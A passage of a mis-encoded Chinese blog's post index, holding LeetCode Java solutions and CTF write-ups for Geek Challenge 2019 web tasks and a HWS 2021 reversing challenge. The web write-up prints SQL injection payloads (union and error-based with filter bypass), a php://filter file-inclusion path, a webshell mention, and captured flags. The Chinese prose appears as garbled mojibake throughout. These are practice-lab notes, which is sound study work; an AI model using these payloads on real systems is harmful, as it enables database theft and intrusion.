else if (grid[row][col] == &#x27;0&#x27; || book[row][col] == 1)return; book[row][col] = 1; for (int i = 0; i &lt; 4; i++) &#123; int post_x = row + step[i][0]; int post_y = col + step[i][1]; numIslandsDfs(grid, post_x, post_y, book); &#125; &#125; public int numIslands(char[][] grid) &#123; /* * ä¸ç”¨ç›´æ¥åˆ¤æ–­å­¤å²› * ä»0å¼€å§‹æ£€ç´¢ï¼Œå¦‚æœbookæ•°ç»„ä¸­æ²¡æœ‰æ ‡è®°ä¸”æ˜¯é™†åœ°ï¼Œåˆ™æ ‡è®°book * å¼€å§‹dfsæ£€ç´¢ * */ int count = 0; height = grid.length; width = grid[0].length; int book[][]= new int[grid.length][grid[0].length]; // ä¸¤å±‚forå¾ªç¯æ¥éå†æ‰€æœ‰åæ ‡ for (int i = 0; i &lt; height; i++) &#123; for (int j = 0; j &lt; width; j++) &#123; // å¦‚æœè¯¥åæ ‡ä¸ºæ°´åŸŸæˆ–è€…æ ‡è®°ä¸º1å°±å¿½ç•¥ if (grid[i][j] == &#x27;0&#x27; || book[i][j] == 1) &#123; continue; &#125;else &#123; numIslandsDfs(grid, i, j, book); count++; &#125; &#125; &#125; return count; &#125;&#125; çŸ©é˜µä¸­çš„è·¯å¾„ 1234567æ€è·¯å¦‚ä¸‹å°†è¿”å›å€¼è®¾ç½®ä¸ºfalseå¦‚æœdfså‡ºä¸€ä¸ªå®Œæ•´çš„å•è¯é“¾åˆ™å°†è¿”å›å€¼è®¾ç½®ä¸ºtrueï¼Œå¹¶ä¸”ç›´æ¥breakéå†è¡¨ï¼Œåªå¯¹åº”å•è¯çš„é¦–å­—ç¬¦é¦–å­—æ¯å­˜åœ¨å°±ç›´æ¥è¿›è¡Œdfséå†ï¼Œéå†çš„æ–¹å‘åªæœ‰å››ä¸ªæ–¹å‘å›æº¯ï¼Œå¦‚æœé“è·¯ä¸ç¬¦åˆéœ€è¦æŠŠä¹‹å‰èµ°è¿‡çš„è·¯å…¨éƒ¨æ¸…0 ç¬¬ä¸€æ¬¡å†™çš„ä»£ç æœ€åä¸‰ä¸ªæ£€æµ‹ç‚¹æ­»æ´»ä¸èƒ½è¿‡ï¼Œä¸‹é¢è´´ç¬¬ä¸€æ¬¡å†™çš„ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940class Solution &#123; int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; int height = 0; int width = 0; boolean objRet = false; public void existDfs(char[][] board, int row, int col, int[][] book, char[] wordArray, int wordIndex)&#123; if (wordIndex == wordArray.length)&#123; this.objRet = true; return; &#125; if (row &gt;= height || row &lt; 0 || col &gt;= width || col &lt; 0 ) return; else if (book[row][col] == 1 || board[row][col] != wordArray[wordIndex]) return; book[row][col] = 1; wordIndex++; for (int i = 0; i &lt; 4; i++) &#123; int post_x = step[i][0] + row; int post_y = step[i][1] + col; existDfs(board, post_x, post_y, book, wordArray, wordIndex); &#125; book[row][col] = 0; &#125; public boolean exist(char[][] board, String word) &#123; char[] wordArray = word.toCharArray(); height = board.length; width = board[0].length; for (int i = 0; i &lt; board.length; i++) &#123; for (int j = 0; j &lt; board[0].length; j++) &#123; if (board[i][j] == wordArray[0])&#123; int[][] book = new int[height][width]; // å¼€å§‹è¿›è¡Œdfsæœç´¢ï¼Œå¦‚æœæœç´¢æˆåŠŸå°±å°†retèµ‹å€¼ä¸ºtrue existDfs(board,i,j,book,wordArray,0); // åˆ¤æ–­åœ¨è¿›è¡Œdfsåæ˜¯å¦æ‰¾åˆ°çŸ©é˜µä¸­ç›¸åº”å•è¯ &#125; &#125; &#125; return this.objRet; &#125;&#125; ç¬¬äºŒæ¬¡å†™çš„ä»£ç ï¼Œè™½ç„¶è¿‡äº†ï¼Œä½†æ˜¯æ•ˆç‡ä¹Ÿå¤ªä½äº†ã€‚ã€‚ã€‚æœäº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class Solution &#123; int[][] step = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;; int height = 0; int width = 0; public boolean existDfs(char[][] board, int row, int col, int[][] book, char[] wordArray, int wordIndex)&#123; if (row &gt;= height || row &lt; 0 || col &gt;= width || col &lt; 0)return false; else if (board[row][col] != wordArray[wordIndex] || book[row][col] == 1)return false; if (wordIndex == wordArray.length-1)return true; boolean ret = false; for (int i = 0; i &lt; 4; i++) &#123; int post_x = step[i][0] + row; int post_y = step[i][1] + col; book[row][col] = 1; ret = existDfs(board, post_x, post_y, book, wordArray, wordIndex+1); if (ret == true)break; book[row][col] = 0; &#125; return ret; &#125; public boolean exist(char[][] board, String word) &#123; /* * é¦–å…ˆå°†è¿”å›å€¼è®¾ç½®ä¸ºfalse * å¦‚æœdfså‡ºä¸€ä¸ªå®Œæ•´çš„å•è¯é“¾åˆ™å°†è¿”å›å€¼è®¾ç½®ä¸ºtrueï¼Œå¹¶ä¸”ç›´æ¥break * * é¦–å…ˆéœ€è¦éå†è¡¨ï¼Œåªå¯¹åº”å•è¯çš„é¦–å­—ç¬¦ * é¦–å­—æ¯å­˜åœ¨å°±ç›´æ¥è¿›è¡Œdfséå† * éå†çš„æ–¹å‘åªæœ‰å››ä¸ªæ–¹å‘ * è¿˜éœ€è¦å›æº¯ï¼Œå¦‚æœé“è·¯ä¸ç¬¦åˆéœ€è¦æŠŠä¹‹å‰èµ°è¿‡çš„è·¯å…¨éƒ¨æ¸…0 * */ char[] wordArray = word.toCharArray(); height = board.length; width = board[0].length; for (int i = 0; i &lt; board.length; i++) &#123; for (int j = 0; j &lt; board[0].length; j++) &#123; int[][] book = new int[height][width]; if (existDfs(board,i,j,book,wordArray,0))&#123; return true; &#125; &#125; &#125; return false; &#125;&#125; è§£ç å¼‚æˆ–åçš„æ•°ç»„ ç®€å•çš„ç­¾åˆ°é¢˜ 1234567891011class Solution &#123; public int[] decode(int[] encoded, int first) &#123; int decodedLength = encoded.length + 1; int[] decoded = new int[decodedLength]; decoded[0] = first; for (int i = 0; i &lt; encoded.length; i++) &#123; decoded[i+1] = encoded[i] ^ decoded[i]; &#125; return decoded; &#125;&#125; æ•°ç»„å¼‚æˆ–æ“ä½œ ä¸¤å¤©éƒ½æ˜¯ç®€å•çš„ç­¾åˆ°é¢˜ï¼Ÿæ„Ÿè§‰è¿™é“é¢˜éšä¾¿éƒ½å¯ä»¥è·‘åˆ°100% 123456789class Solution &#123; public int xorOperation(int n, int start) &#123; int retNum = start; for (int i = 1; i &lt; n; i++) &#123; retNum ^= start+i*2; &#125; return retNum; &#125;&#125; èºæ—‹çŸ©é˜µâ… å¼€å§‹èºæ—‹çŸ©é˜µä¸‰éƒ¨æ›²å†²å†²å†²ğŸ±â€ğŸ ç»å…¸é¢˜ç›®ï¼Œå­¦Cè¯­è¨€çš„æ—¶å€™çœ‹è¿‡æ²¡å†™è¿‡ï¼Œå†™å…³äºçŸ©é˜µçš„ä¸œè¥¿éœ€è¦æ‰¾åˆ°çŸ©é˜µå˜åŒ–è§„å¾‹ã€‚ ç½‘ä¸Šæ‰¾çš„å›¾ï¼Œå°±æ˜¯æŠŠå››æ¡è¾¹åŠ¨æ€åŒ–ï¼ˆåæ­£è¿™ä¸ªæ€è·¯æˆ‘æ˜¯æƒ³ä¸å‡ºæ¥ï¼‰ã€‚çŸ©é˜µçš„ä¸Šä¸‹ä¸¤æ¡è¾¹å¯¹åº”ï¼Œå·¦å³ä¸¤æ¡è¾¹å¯¹åº”ï¼Œä¸€è¾¹åœ¨åŠ åˆ™å¦ä¸€è¾¹å‡ï¼Œç›´åˆ°ä¸¤æ¡è¾¹é‡åˆã€‚ 123æ€è·¯:å®šä¹‰çŸ©é˜µçš„å››æ¡è¾¹æ¯å½“éå†å®Œä¸€å±‚è¿™æ¡è¾¹å°±å‡1 123456789101112131415161718192021222324252627282930313233class Solution &#123; public List&lt;Integer&gt; spiralOrder(int[][] matrix) &#123; /* * å®šä¹‰å››ä¸ªè¾¹ç•Œ * ä¸¤ä¸¤å¯¹åº” * ä¸€è¾¹åŠ å°±ä¸€è¾¹å‡*/ int up = 0,down = matrix.length - 1; int left = 0,right = matrix[0].length - 1; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); while (true)&#123; for (int i = left; i &lt;= right; i++) &#123; list.add(matrix[up][i]); &#125; if (++up&gt;down)break; for (int i = up; i &lt;= down; i++) &#123; list.add(matrix[i][right]); &#125; if (--right &lt; left)break; for (int i = right; i &gt;= left ; i--) &#123; list.add(matrix[down][i]); &#125; if (--down &lt; up)break; for (int i = down; i &gt;= up ; i--) &#123; list.add(matrix[i][left]); &#125; if (++left &gt; right)break; &#125; return list; &#125;&#125; èºæ—‹çŸ©é˜µâ…¡ å’Œèºæ—‹çŸ©é˜µâ… çš„æ€è·¯æ˜¯ä¸€æ ·çš„ 12345678910111213141516171819202122232425262728293031class Solution &#123; public int[][] generateMatrix(int n) &#123; int left = 0,right = n - 1; int up = 0, down = n - 1; int[][] matrix = new int[n][n]; int num=1; while (true)&#123; for (int i = up; i &lt;= right; i++) &#123; matrix[up][i] = num++; &#125; if (++up&gt;down)break; for (int i = up; i &lt;= down ; i++) &#123; matrix[i][right] = num++; &#125; if (--right &lt; left)break; for (int i = right; i &gt;= left ; i--) &#123; matrix[down][i] = num++; &#125; if (--down &lt; up)break; for (int i = down; i &gt;= up ; i--) &#123; matrix[i][left] = num++; &#125; if (++left&gt;right)break; &#125; return matrix; &#125;&#125; èºæ—‹çŸ©é˜µâ…¢ ä¸¤ç§æ€è·¯ï¼š å’Œä¸Šé¢çš„æ€è·¯ä¸€æ ·ï¼ŒåŠ¨æ€æ¨¡æ‹Ÿå››æ¡è¾¹ æ‰¾è§„å¾‹ï¼Œé€šè¿‡è§‚å¯Ÿå¯çŸ¥ï¼Œæ¯æ¬¡å³ç§»å’Œä¸‹ç§»èµ°çš„æ­¥æ•°æ˜¯å¥‡æ•°ï¼Œå·¦ç§»å’Œä¸Šç§»èµ°çš„æ­¥æ•°æ˜¯å¶æ•°ï¼Œæ‰€ä»¥å¯ä»¥ä»¥èµ·å§‹ç‚¹ä¸ºä¸­å¿ƒï¼ˆä¸Šå›¾å…¶å®éƒ½è¡¨ç¤ºå‡ºæ¥äº†ï¼‰ï¼Œå®šä¹‰ä¸€ä¸ªæ­£æ–¹å½¢ï¼Œéå†è¿™ä¸ªæ­£æ–¹å½¢çš„æ‰€æœ‰åæ ‡ï¼Œå¦‚æœåæ ‡èŒƒå›´åœ¨çŸ©å½¢å†…ï¼Œåˆ™ç¬¦åˆæ¡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061class Solution &#123; public boolean checkPost(int R,int C,int r0,int c0)&#123; if (r0&gt;=R || r0&lt;0 || c0&gt;=C || c0&lt;0) return false; else return true; &#125; public int[][] spiralMatrixIII(int R, int C, int r0, int c0) &#123; // è¾“å…¥å‚æ•°ï¼ŒçŸ©é˜µå®½é«˜ï¼Œèµ·å§‹ä½ç½® /* * å°†ä¸è§„åˆ™çŸ©é˜µçœ‹æˆæ­£æ–¹å½¢ * æ¨¡æ‹Ÿä¸Šä¸‹å·¦å³è¾¹ç•Œ * å•ç‹¬è®¾ç½®ä¸€ä¸ªæŠ€æœ¯å˜é‡åˆ¤æ–­æ˜¯å¦éå†å®Œæˆ * éå†æ–¹å‘ï¼šå³ï¼Œä¸‹ï¼Œå·¦ï¼Œä¸Š*/ int[][] arr = new int[R*C][2]; int num = 0; int max = R&gt;=C?R:C; arr[num][0] = r0; arr[num][1] = c0; for (int i = 1; i &lt;= max*2; i+=2) &#123; for (int j = 1; j &lt;= i; j++) &#123; c0+=1; if (checkPost(R,C,r0,c0))&#123; ++num; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt;= i; j++) &#123; r0 += 1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt; i+2; j++) &#123; c0 -=1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; for (int j = 1; j &lt; i+2; j++) &#123; r0 -= 1; if (checkPost(R,C,r0,c0))&#123; ++num ; arr[num][0]=r0; arr[num][1]=c0;// System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0); &#125; &#125; &#125; return arr; &#125;&#125;","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://example.com/tags/leetcode/"}]},{"title":"2019æå®¢å¤§æŒ‘æˆ˜web","slug":"ctf/wp/æå®¢å¤§æŒ‘æˆ˜2019","date":"2021-07-14T04:44:17.040Z","updated":"2022-01-01T09:53:36.224Z","comments":true,"path":"6345/","link":"","permalink":"http://example.com/6345/","excerpt":"","text":"[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQLä¸‡èƒ½å¯†ç ç›´æ¥å‡º 11&#x27; and &#x27;1&#x27; = &#x27;1 [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL é¦–å…ˆæŸ¥å‡ºå•å¼•å·æŠ¥é”™ å°è¯•ç”¨ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªæ— ç”¨çš„å€¼ï¼ŒCMD5ç½‘ç«™ä¹Ÿæ— æ³•ç ´è§£ï¼Œå°è¯•å…¶ä»–æ–¹æ³• å°è¯•ä¸­æ–­æ³¨å…¥ï¼Œè”åˆæ³¨å…¥æŸ¥çœ‹å…¶ä»–ä¿¡æ¯å¯ä»¥çœ‹åˆ°ç”¨åˆ°äº†æŸ¥è¯¢çš„ç¬¬2ï¼Œ3ä¸ªå­—æ®µ 11&#x27; and 1=2 union select 1,2,3 # è·å–å½“å‰æ•°æ®åº“åï¼Œå›æ˜¾å‡ºå½“å‰æ•°æ®åº“åä¸ºgeek 11&#x27; and 1=2 union select 1,database(),version() # æŸ¥è¯¢æ•°æ®åº“é‡Œé¢çš„è¡¨åç§° 12345# æŸ¥è¯¢æ‰€æœ‰è¡¨åselect table_name from information_schema.tables where table_schema = &#x27;database_name&#x27;# æŸ¥è¯¢æ‰€æœ‰åˆ—åselect column_name from information_schema.columns where table_name= &#x27;è¡¨å&#x27; and table_schema= &#x27;æ•°æ®åº“å&#x27; è¿™é‡Œéœ€è¦åŠ ä¸Šlimité™åˆ¶è¿”å›çš„åˆ—æ•°ï¼Œæ‰‹å·¥æŸ¥å‡ºgeekæ•°æ®åº“ä¸‹åªæœ‰ä¸¤ä¸ªè¡¨ï¼šgeekuserå’Œl0ve1ysq1 11&#x27; and 1=2 union select 1,2,table_name from information_schema.tables where table_schema = &#x27;geek&#x27; limit 0,1 # æŸ¥è¯¢è¡¨çš„åˆ—åï¼Œæˆ‘å½“æ—¶æ˜¯ä¸€ä¸ªä¸€ä¸ªæŸ¥çš„ï¼Œçœ‹åˆ«äººwpå‘ç°å¯ä»¥ä¸€æ¬¡å°±å…¨éƒ¨æŸ¥å‡ºæ¥ã€‚ã€‚æŸ¥å‡ºä¸‰ä¸ªåˆ—åç§° 1select column_name from information_schema.columns where table_name= &#x27;è¡¨å&#x27; and table_schema= &#x27;æ•°æ®åº“å&#x27; 11&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; è·å–æ•°æ®åº“ä¸­ä¿¡æ¯ æˆ‘å…ˆæ˜¯æ‰‹å·¥æŸ¥ï¼Œåé¢åŠ äº†ä¸€ä¸ªwhereè¯­å¥æ¡ä»¶å°±ç›´æ¥å‡ºäº†ã€‚ã€‚è¿æ°”å¥½ï¼Œç½‘ä¸Šå¸ˆå‚…wpéƒ½æ˜¯æŠŠè¡¨ä¸­çš„æ•°æ®å…¨éƒ¨è¡ä¸‹æ¥ã€‚å­¦ä¹ ä¸€æ‰‹ 11&#x27; and 1=2 union select 1,username,password from l0ve1ysq1 where username = &#x27;flag&#x27; # ç½‘ä¸Šå¸ˆå‚…çš„åšæ³•ï¼Œå¯¹mysqlä¸­çš„å‡½æ•°ä¸€ç‚¹éƒ½ä¸ç†Ÿæ‚‰ï¼Œè¾¹sqliè¾¹å­¦mysqlå‡½æ•°å§ã€‚ã€‚ 11&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.l0ve1ysq1 # [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLè€ƒç‚¹ï¼šç»•è¿‡ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ è¿‡æ»¤äº†or,and,select,union,fromè¿™äº›å…³é”®å­—ï¼Œç”¨æ‰€æœ‰å…³é”®å­—ç”¨åŒå†™ç»•è¿‡ï¼Œè¿‡ç¨‹å’ŒLoveSQLè¿‡ç¨‹ä¸€æ · [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLè€ƒç‚¹ï¼šSQLæŠ¥é”™æ³¨å…¥ è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç­‰å·ï¼Œunionï¼Œandç­‰å­—ç¬¦ï¼Œä¸»è¦éš¾ç‚¹åœ¨äºç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼Œéœ€è¦ç”¨æ‹¬å·æ¥ç»•è¿‡ çˆ†åº“ 1username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(database()))))%23 çˆ†è¡¨ 1username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%23 çˆ†å­—æ®µå 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23 æŸ¥flag éœ€è¦ç”¨leftå’Œrightåˆ†åˆ«æŸ¥å·¦è¾¹å’Œå³è¾¹ï¼Œç„¶åä¸ªflagæ‹¼æ¥ 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(left(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(right(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23 1flag&#123;c36b7fc4-a9fe-4d02-97c6-d3c8b35ead69&#125; [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQLSQLç›²æ³¨ [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret Fileè€ƒç‚¹ï¼šæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ŒPHPä¼ªåè®® æŠ“åŒ…æŠ“åˆ°ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œè®¿é—®ç›®å½•æŸ¥çœ‹ æŸ¥çœ‹ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯è®¿é—®flag.phpå´ä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ä½¿ç”¨php://filteråè®®å¯¹æ–‡ä»¶è¿›è¡Œbase64ç¼–ç æŸ¥çœ‹ 1è®¿é—®åç¼€ï¼šsecr3t.php?file=php://filter/convert.base64-encode/resource=flag.php flag.phpä¸­çš„å†…å®¹å…¨éƒ¨ä»¥base64ç¼–ç çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çº¿è§£ç å¾—åˆ°flag 1PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MWZkYzRlMDItODU1MS00ZTY3LThkNzUtZmY3ZDkzZDJmNjg5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= [æå®¢å¤§æŒ‘æˆ˜ 2019]Knifeä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥ç”¨èšå‰‘è¿æ¥ç½‘ç«™åå°ï¼Œflagåœ¨æ ¹ç›®å½• [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPè€ƒå¯Ÿç½‘ç«™å¸¸ç”¨å¤‡ä»½åç¼€åï¼ŒPHPçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ– é¦–å…ˆæç¤ºäº†ç½‘ç«™å¤‡ä»½ï¼Œç”¨å¸¸ç”¨çš„ç½‘ç«™å¤‡ä»½å­—å…¸çˆ†ç ´ï¼Œçˆ†ç ´å‡ºwww.zipï¼Œåœ¨åç¼€è¾“å…¥ä¸‹è½½ [æå®¢å¤§æŒ‘æˆ˜ 2019]HttpHTTPå¤´éƒ¨ä¼ªé€ ï¼Œæ¯”è¾ƒè¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯éœ€è¦å­¦ä¹ HTTPåè®® /sbin/nologin","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"},{"name":"web","slug":"ctf/web","permalink":"http://example.com/categories/ctf/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"HWSè®¡åˆ’2021ç¡¬ä»¶å®‰å…¨å†¬ä»¤è¥çº¿ä¸Šé€‰æ‹”èµ›","slug":"ctf/wp/HWSCTF","date":"2021-07-14T04:44:17.040Z","updated":"2022-01-01T09:53:51.752Z","comments":true,"path":"23409/","link":"","permalink":"http://example.com/23409/","excerpt":"","text":"babyre ä¸€é“hooké¢˜ï¼Œidaæ‰“å¼€ä»£ç è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œé¦–å…ˆåˆ¤æ–­é•¿åº¦ç„¶ååœ¨åŠ å¯†ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ææ¸…æ¥šè¿™ä¸ªhookçš„æµç¨‹ï¼Œå¬åˆ«çš„å¸ˆå‚…è¯´çš„åœ¨CRTçš„æ—¶å€™ï¼Œä»r3åˆ°r0æ—¶å€™hookçš„ğŸ˜¥ï¼ˆå¬çš„ä¸æ˜¯å¾ˆæ‡‚ï¼‰ï¼Œä½†æ˜¯æˆ‘çæ‰¾æ‰¾åˆ°è¿™ä¸¤ä¸ªå‡½æ•° èµ„æºè§£å¯† èµ„æºåŠ è½½ å¯ä»¥çœ‹å‡ºç¨‹åºåŠ è½½äº†ä¸€ä¸ªå«CIPHER_DLLçš„èµ„æº,è¿™ä¸ªèµ„æºå…¶å®å°±æ˜¯ç»è¿‡åŠ å¯†çš„DLLï¼Œæˆ‘ç”¨ResourceHacker(ä¸€ä¸ªå¯ä»¥æŸ¥çœ‹ç¨‹åºèµ„æºçš„å·¥å…·)æ¥æŸ¥çœ‹ç¨‹åºä¸­çš„èµ„æº ç¨‹åºä¸­ç¡®å®æœ‰ä¸€ä¸ªå«CIPHER_DLLçš„èµ„æº,ä¸”è¿™ä¸ªèµ„æºéœ€è¦è§£å¯†æ‰èƒ½ä½¿ç”¨,å›¾ä¸­**wow!**å°±æ˜¯è¯æ˜,æŠŠè¿™ä¸ªèµ„æºçš„äºŒè¿›åˆ¶æ–‡ä»¶æå‡ºæ¥,åœ¨è§£å¯†å›å»,å¾—åˆ°ä¸€ä¸ªDLL 1234567891011121314import structimport os//è§£å¯†èµ„æºdef ResourceDecrypt(): filepath = &#x27;C:\\\\Users\\\\86180\\\\Desktop\\\\CIPHER_DLL101&#x27; dllpath = &#x27;C:\\\\Users\\\\86180\\\\Desktop\\\\DLL.dll&#x27; key = &#x27;wow!&#x27; size = os.path.getsize(filepath) # è·å¾—æ–‡ä»¶å¤§å° with open(filepath, &#x27;rb&#x27;) as cipher_stream: with open(dllpath, &#x27;wb&#x27;) as dll_stream: for i in range(size): data = struct.unpack(&#x27;B&#x27;, cipher_stream.read(1))[0] ^ ord(key[i%4]) dll_stream.write(struct.pack(&#x27;B&#x27;, data)) æŠŠDLLç”¨idaæ‰“å¼€,æŸ¥çœ‹åŠ å¯†å‡½æ•°,å­—ç¬¦ä¸²å·²ç»å‘Šè¯‰æˆ‘ä»¬æ˜¯SM4åŠ å¯†,æ²¡æœ‰é­”æ”¹. SM4Githubä»£ç é“¾æ¥ 1234567891011121314151617181920212223242526from ida import ida_bytesimport pysm4# ä»idaä¸­æå–åŠ å¯†åçš„æ•°æ®def Dump_ida_data(): addr = 0x00BFA808 res = [] for i in range(32): res.append(get_byte(addr + i)) print(bytes(res).hex()) # åˆ©ç”¨GitHubä¸Šæ‰¾çš„sm4è„šæœ¬,å†™çš„è§£å¯†å‡½æ•° def Decrypt(): string = b&#x27;Ez_5M4_C1pH@r!!!&#x27;.hex() key = 0x457a5f354d345f433170484072212121 cipher1 = 0xea6358b78ce2a1e9c5298f53e8083259 cipher2 = 0xaf1b67aed9dacfc472ffb1ec7673f306 plain1 = hex(pysm4.decrypt(cipher1, key))[2:] plain2 = hex(pysm4.decrypt(cipher2, key))[2:] for i in range(0,len(plain1),2): print(chr(int(plain1[i:i+2],16)),end=&#x27;&#x27;) for i in range(0,len(plain1),2): print(chr(int(plain2[i:i+2],16)),end=&#x27;&#x27;) # flag&#123;42b061b4cb41cfa89ca78047bde1856e&#125; child_protectå‚è€ƒçœ‹é›ªçš„ä¸€ç¯‡æ–‡ç« ï¼šhttps://bbs.pediy.com/thread-95082.htm è¿™é“é¢˜è€ƒçš„æ˜¯åŒè¿›ç¨‹å®ˆæŠ¤é—®é¢˜ï¼Œä¸Šé¢çš„æ–‡ç« å’Œè¿™é“é¢˜ç±»ä¼¼ï¼Œä½†æ˜¯éš¾ç‚¹åœ¨äºè°ƒè¯•ã€‚ idaæ‰“å¼€åå‘ç°ä¸»å‡½æ•°æ— æ³•æ­£å¸¸åç¼–è¯‘ï¼Œè€Œä¸”çœ‹åˆ°äº†int3ä¸­æ–­å¼‚å¸¸æŒ‡ä»¤ã€‚ç”±äºæ˜¯åŒè¿›ç¨‹å®ˆæŠ¤ï¼Œéœ€è¦æ‰¾åˆ°åˆ›å»ºå­è¿›ç¨‹çš„åœ°æ–¹ é€šè¿‡æœç´¢CreateProcesså‡½æ•°ï¼Œç¡®å®šå­è¿›ç¨‹ç”±å‡½æ•°sub_413670åˆ›å»º ç»§ç»­è·Ÿè¸ªï¼Œç¡®å®šäº†ä¸¤ä¸ªå‡½æ•°è°ƒç”¨å­è¿›ç¨‹ï¼Œåˆ†åˆ«æ˜¯sub_413BE0å’Œsub_413950 è€Œå‡½æ•°sub_413950æ˜¯ä¸€ä¸ªå…³é”®å‡½æ•°ï¼Œä»–å¯¹å­è¿›ç¨‹åšäº†ä¿®æ”¹ã€‚å¦‚æœæƒ³è®©idaæ­£ç¡®çš„åç¼–è¯‘ï¼Œæˆ‘ä»¬éœ€è¦nopæ‰æ‰€æœ‰çš„int3æŒ‡ä»¤ï¼Œä¸”æŒ‰ç…§ç¨‹åºä¿®æ”¹éƒ¨åˆ†æŒ‡ä»¤ï¼Œè¿™é‡Œæˆ‘ç”¨010Editorè¿›è¡Œä¿®æ”¹ã€‚ é¦–å…ˆæ‰¾åˆ°æ‰€æœ‰çš„int3æŒ‡ä»¤ ä¸Šå›¾å°±æ˜¯éœ€è¦æˆ‘ä»¬é¦–å…ˆnopæ‰çš„åœ°æ–¹ï¼Œç”¨010Editorä¿®æ”¹åå†æ¬¡ç”¨idaæ‰“å¼€å¯ä»¥å‘ç°ä¸»å‡½æ•°å·²ç»å¯ä»¥æ­£å¸¸åç¼–è¯‘ï¼Œä½†æ˜¯è¿˜ä¸èƒ½å¤ŸåŠ¨æ€è°ƒè¯•ï¼Œ å› ä¸ºæ‰€æœ‰çš„è¿‡ç¨‹éƒ½æ˜¯åœ¨å­è¿›ç¨‹ä¸­è¿›è¡Œï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨å·²ç»ä¿®æ”¹äº†çˆ¶è¿›ç¨‹çš„æ•°æ®å’Œå­è¿›ç¨‹ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥è·³è¿‡è°ƒç”¨å­è¿›ç¨‹çš„æ­¥éª¤ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€éƒ¨åˆ†æ•°æ®ã€‚ 